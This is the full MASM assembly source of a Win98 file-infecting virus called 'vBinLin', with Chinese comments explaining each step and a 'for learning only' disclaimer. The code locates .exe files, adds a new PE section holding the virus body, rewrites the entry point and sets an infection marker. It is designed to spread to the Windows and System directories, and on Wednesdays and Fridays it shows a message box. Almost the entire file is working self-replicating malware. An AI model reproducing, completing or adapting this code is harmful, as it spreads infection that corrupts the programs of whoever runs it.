;=========================================< 彬 >==
;名 称: vBinLin病毒
　　　; 
;语 言: MASM Win98
;日 期: 2001年8月24日
;====================================================
;出 处: 
;备 注: 有关代码未屏蔽！请注意！若没完全明白请误调试
　　　; 病毒本是一种高级编程技术，本代码只供学习使用
　　　; ，若用到其它用途本人概不负责！
;===================================================
.386
.model flat,stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\comctl32.inc
include \masm32\include\user32.inc
include \masm32\include\gdi32.inc
include \masm32\include\comdlg32.inc

includelib \masm32\lib\gdi32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\comctl32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\comdlg32.lib
;这是一些相关的定义，其实程序中根本就没用到
;只是我习惯，一股脑的全搬上来啦 
;------------------------------------(上面的)--

.data
mcaption db "你好朋友!",0
mtitle db "*标题*",0
; 主程序所用到的一些变量
;------------------------------------(上面的)--

.code
host_start:
invoke MessageBox,NULL,offset mcaption,offset mtitle,64
invoke ExitProcess,0
;主程序代码，只是简单的打一串字符而已。
;病毒代码运行完后，就会跳到此处执行。
;------------------------------------(上面的)--

BadDay SEGMENT PARA USE32 'BadDay'
assume cs:BadDay,ds:BadDay
vstart:
push ebp
push esp
call nstart
nstart: 
;;;;;;;;;;;;;
pop ebp
sub ebp,offset nstart
;病毒中常用的一种方法。得到一个偏移差。
;程序后面用到的所有变量都需要加上个这偏移差
;------------------------------------(上面的)--

;=========================
; * 更改程序入口地址 *
cmp now_basein[ebp],0
jnz gonext
mov now_basein[ebp],401000h
gonext:
cmp des_basein[ebp],0
jnz change
mov des_basein[ebp],401000h
change:
mov eax,now_basein[ebp]
push des_basein[ebp]
pop now_basein[ebp]
mov des_basein[ebp],eax
;变量定义的的意思见后方
;程序开始执行时，当前程序的原入口地址会放到des_basein中
;由于程序中des_basein有别的用途，因此将此地址存放到
;now_basein，以便最后跳回原程序入口。
;------------------------------------(上面的)--

;-------------------------
;目录的开头部份
lea eax,NowPath[ebp]
push eax
mov eax,256
push eax
call vGetCurrentDirectory
;通过API函数得到当前程序所在目录
;------------------------------------(上面的)--

lea eax,NowPath[ebp]
push eax
lea eax,SrcDir[ebp]
push eax
call vlstrcpy
;保存当前目录
;------------------------------------(上面的)--

mov NowPathNo[ebp],1
FindStartT:
cmp NowPathNo[ebp],1
jz GFindFt
cmp NowPathNo[ebp],2
jz GetWinD
cmp NowPathNo[ebp],3
jz GetSysD
jmp AllFindEnd 
;根据NowPathNor值来判断感染哪个目录的文件
;------------------------------------(上面的)--

GetWinD: 

mov eax,256
push eax
lea eax,NowPath[ebp]
push eax
call vGetWindowsDirectory

lea eax,NowPath[ebp]
push eax
call vSetCurrentDirectory
jmp GFindFt
;得到WINDOWS所在目录，并且将其设为当前目录
;------------------------------------(上面的)--

GetSysD:

mov eax,256
push eax
lea eax,NowPath[ebp]
push eax
call vGetSystemDirectory

lea eax,NowPath[ebp]
push eax
call vSetCurrentDirectory
;得到SYSTEM所在目录，并且将其设为当前目录
;------------------------------------(上面的)--

GFindFt:
lea eax,FindData[ebp]
push eax
lea eax,FileFilter[ebp]
push eax
call vFindFirstFile
cmp eax,INVALID_HANDLE_VALUE
jz FindEnds
mov hFind[ebp],eax
;查找当前目录下的第一个EXE文件
;------------------------------------(上面的)--

GoOnFind: 
;以下是病毒传染部份
;-------------------------
push 0
push FILE_ATTRIBUTE_NORMAL
push OPEN_EXISTING
push 0
push FILE_SHARE_READ+FILE_SHARE_WRITE
push GENERIC_READ+GENERIC_WRITE
lea eax,FindData[ebp].cFileName
push eax
call vCreateFile
;打开文件
;------------------------------------(上面的)--

cmp eax,INVALID_HANDLE_VALUE
jz createfail

mov hFile[ebp],eax
push FILE_BEGIN
push 0
push 3ch
push hFile[ebp]
call vSetFilePointer
;将文件指针指到3CH处（见前面的讲的）
;------------------------------------(上面的)--

push 0
lea eax,byte_read[ebp]
push eax
push 4
lea eax,PE_head_addr[ebp]
push eax
push hFile[ebp]
call vReadFile
;得到PE头偏移地址
;------------------------------------(上面的)--

cmp eax,0
jz readfail
push FILE_BEGIN
push 0
push PE_head_addr[ebp]
push hFile[ebp]
call vSetFilePointer
;指文件指针定位到PE头处
;------------------------------------(上面的)--

mov Head_len[ebp],sizeof PE_head+sizeof Section_table

push 0
lea eax,byte_read[ebp]
push eax
push Head_len[ebp]
lea eax,PE_head[ebp]
push eax
push hFile[ebp]
call vReadFile
;从PE头处开始读，最所读数据存放在缓冲区中
;------------------------------------(上面的)--

cmp dword ptr PE_head[ebp].Signature,IMAGE_NT_SIGNATURE
jnz exitwrite
;检查是否是PE文件，不是就跳出
;------------------------------------(上面的)--

cmp word ptr PE_head[ebp+1ah],0842h 
jz exitwrite
;若已感染过也跳
;------------------------------------(上面的)--

Noinfect:
;保存与程序入口相关的RVA
push PE_head[ebp].OptionalHeader.AddressOfEntryPoint
pop des_in[ebp]
push PE_head[ebp].OptionalHeader.ImageBase
pop des_base[ebp]
mov eax,des_in[ebp]
add eax,des_base[ebp]
mov des_basein[ebp],eax 
;保存将要感染的程序的入口RVA和默认装入内存的地址
;------------------------------------(上面的)--


movzx eax,PE_head[ebp].FileHeader.SizeOfOptionalHeader
add eax,18h
mov Section_addr[ebp],eax
;得到第一个节的地址
;------------------------------------(上面的)--

mov checker_len[ebp],offset vend-offset vstart
;得到病毒代码的长度
;------------------------------------(上面的)--

movzx eax,PE_head[ebp].FileHeader.NumberOfSections
inc eax
mov ecx,28h
mul ecx
add eax,Section_addr[ebp]
add eax,PE_head_addr[ebp]
cmp eax,PE_head[ebp].OptionalHeader.SizeOfHeaders
;检测当前文件头的剩余空间可否再加一个节。
;------------------------------------(上面的)--

ja exitwrite
lea esi,Section_table[ebp]
movzx eax,PE_head[ebp].FileHeader.NumberOfSections
mov ecx,28h
mul ecx
add esi,eax
inc PE_head[ebp].FileHeader.NumberOfSections
lea edi,new_section[ebp]
xchg edi,esi
;填加一个节
;------------------------------------(上面的)--

mov eax,[edi-28h+8]
add eax,[edi-28h+0ch]
mov ecx,PE_head[ebp].OptionalHeader.SectionAlignment
div ecx
inc eax
mul ecx
mov new_section[ebp].virt_addr,eax
;建立新块，并且块对齐，得到新块入口地址
;------------------------------------(上面的)--

mov eax,checker_len[ebp]
mov ecx,PE_head[ebp].OptionalHeader.FileAlignment
div ecx
inc eax
mul ecx
mov new_section[ebp].raw_size,eax
;得出新块的物理大小，按文件对齐 
;------------------------------------(上面的)-- 

mov eax,checker_len[ebp]
mov ecx,PE_head[ebp].OptionalHeader.SectionAlignment
div ecx
inc eax
mul ecx
mov new_section[ebp].virt_size,eax
;得出虚拟地址，按块对齐
;------------------------------------(上面的)--


mov eax,[edi-28h+14h]
add eax,[edi-28h+10h]
mov ecx,PE_head[ebp].OptionalHeader.SectionAlignment
div ecx
inc eax
mul ecx
mov new_section[ebp].raw_offset,eax
;得到文件中的偏移。（按理说应该是文件最末）
;------------------------------------(上面的)--


mov eax,new_section[ebp].virt_size
add eax,PE_head[ebp].OptionalHeader.SizeOfImage
mov ecx,PE_head[ebp].OptionalHeader.SectionAlignment
div ecx
inc eax
mul ecx
mov PE_head[ebp].OptionalHeader.SizeOfImage,eax
;更新文件总尺寸。即原文件尺寸加上新块的虚拟尺寸然后对齐
;------------------------------------(上面的)--

mov ecx,28h
rep movsb
;填加新块内容
;------------------------------------(上面的)-- 

mov eax,new_section[ebp].virt_addr
mov PE_head[ebp].OptionalHeader.AddressOfEntryPoint,eax
;改入口地址
;------------------------------------(上面的)--

mov word ptr PE_head[ebp+1ah],0842h
;填加感染标志
;------------------------------------(上面的)--

push FILE_BEGIN
push 0
push PE_head_addr[ebp]
push hFile[ebp]
call vSetFilePointer
;调指针
;------------------------------------(上面的)--

push 0
lea eax,byte_read[ebp]
push eax
push Head_len[ebp]
lea eax,PE_head[ebp]
push eax
push hFile[ebp]
call vWriteFile
;更新文件头
;------------------------------------(上面的)--

push FILE_BEGIN
push 0
push new_section[ebp].raw_offset
push hFile[ebp]
call vSetFilePointer
;更新指针（到文件尾）
;------------------------------------(上面的)--

push 0
lea eax,byte_read[ebp]
push eax
push new_section[ebp].raw_size
lea eax,vstart[ebp]
push eax
push hFile[ebp]
call vWriteFile
;写病毒代码
;------------------------------------(上面的)--
exitwrite:

readfail:
push hFile[ebp]
call vCloseHandle
;关闭当前文件
;------------------------------------(上面的)--
createfail:


;--------------------------------
;目录结尾区
EndDir: 
lea eax,FindData[ebp]
push eax
push hFind[ebp]
call vFindNextFile
cmp eax,0
jnz GoOnFind 
;查找下一个文件，然后继续感染，直到全感染全为止
;------------------------------------(上面的)--
FindEnds:
push hFind[ebp]
call vFindClose
inc NowPathNo[ebp]
inc NowPathNo[ebp] ;<< 多加了几个1
inc NowPathNo[ebp] ;<<
inc NowPathNo[ebp] ;<<
jmp FindStartT
;为了调试方便，在此只感染当前目录
;------------------------------------(上面的)--

AllFindEnd:
lea eax,SrcDir[ebp]
push eax
call vSetCurrentDirectory

;恢复当前目录
;------------------------------------(上面的)--

;####[ 病毒发作区 ]########################; 

lea eax,NowTimes[ebp]
push eax
call vGetSystemTime
cmp NowTimes[ebp].wDayOfWeek,0003h
jz InTimes
cmp NowTimes[ebp].wDayOfWeek,0005h
jnz ExitTimes
;根据时间决定，每周星期三和星期五发作
;------------------------------------(上面的)--

;--- 发作代码 -------------------
InTimes:
;--------------------------------
push 0
lea eax,MyTitle[ebp]
push eax
lea eax,MyTalk[ebp]
push eax
push 0
call vMessageBox
;显示一个提示窗口
;------------------------------------(上面的)--

ExitTimes:

;###########################################;
; 恢复寄存器，跳回原程序处 
;------------------------------------------
mov eax,now_basein[ebp]
pop esp
pop ebp
push eax
;-------< 做好返回原程序的准备 >-----------
;;;;;;;;;;;;;;

ret ;返回主程序

;--------------------------
; 函数调用地址
;--------------------------
vCreateFile: 
mov jumpaddr[ebp],0BFF77B5BH
jmp jumpaddr[ebp]

vSetFilePointer: 
mov jumpaddr[ebp],0BFF771BBH
jmp jumpaddr[ebp]

vReadFile: 
mov jumpaddr[ebp],0BFF770B9H
jmp jumpaddr[ebp]

vWriteFile: 
mov jumpaddr[ebp],0BFF77051H
jmp jumpaddr[ebp]

vCloseHandle: 
mov jumpaddr[ebp],0BFF7E2D9H
jmp jumpaddr[ebp]

vMessageBox: 
mov jumpaddr[ebp],0BFF541BAH
jmp jumpaddr[ebp]

vGetCurrentDirectory: 
mov jumpaddr[ebp],0BFF77A55H
jmp jumpaddr[ebp]

vGetWindowsDirectory: 
mov jumpaddr[ebp],0BFF779F8H
jmp jumpaddr[ebp]

vGetSystemDirectory: 
mov jumpaddr[ebp],0BFF779C2H
jmp jumpaddr[ebp]

vSetCurrentDirectory: 
mov jumpaddr[ebp],0BFF77A2EH
jmp jumpaddr[ebp]

vlstrcpy: 
mov jumpaddr[ebp],0BFF77378H
jmp jumpaddr[ebp]

vFindFirstFile: 
mov jumpaddr[ebp],0BFF77BD7H
jmp jumpaddr[ebp]

vFindNextFile: 
mov jumpaddr[ebp],0BFF77C0FH
jmp jumpaddr[ebp]

vFindClose: 
mov jumpaddr[ebp],0BFF76540H
jmp jumpaddr[ebp]

vGetSystemTime: 
mov jumpaddr[ebp],0BFFA1372H
jmp jumpaddr[ebp]

vExitWindowsEx: 
mov jumpaddr[ebp],0BFF5232CH
jmp jumpaddr[ebp]

; 其它的略....


;不同的WIN系统这里的地址是不同的。
;因此说这个病毒并不是每个WIN系统都会传染的 
;------------------------------------(上面的)-- 

ALIGN 4
jumpaddr dd 0
PE_head_addr dd 0
checker_len dd 0


MyTitle db "MyTitle",0
MyTalk db "MyTalk",0


PE_head IMAGE_NT_HEADERS <0> 
Section_table db 280h dup (0)
Head_len dd 0;sizeof PE_head+sizeof Section_table ; PE文件头和块表的长度

my_section struc
sec_name db 2Eh,42h,61h,64h,44h,61h,79h,0 ; 块名
virt_size dd 0 ; 块长
virt_addr dd 0 ; 该块RVA地址
raw_size dd 0 ; 该块物理长度
raw_offset dd 0 ; 该块物理偏移
dd 0,0,0 ; 未用
sec_flags dd 0E0000020h ; 属性 
my_section ends
new_section my_section <>


secbuffer db 512 dup (0)
tempbuffer db 128 dup (0)

hFile dd 0 
des_in dd 0
des_base dd 0
db "SRCIN",0
des_basein dd 0
now_basein dd 0
byte_read dd 0
Section_addr dd 0
vsize dd 0
;相关的变量定义
;------------------------------------(上面的)--

;-----------------------------
; 查找文件专用

FileFilter db "*.exe",0
FindData WIN32_FIND_DATA <>
hFind dd 0
NowPath db 256 dup (0)
NowPathNo db 0
SrcDir db 256 dup (0)
;-----------------------------
NowTimes SYSTEMTIME <>
;-----------------------------


vend:
BadDay ends

end vstart
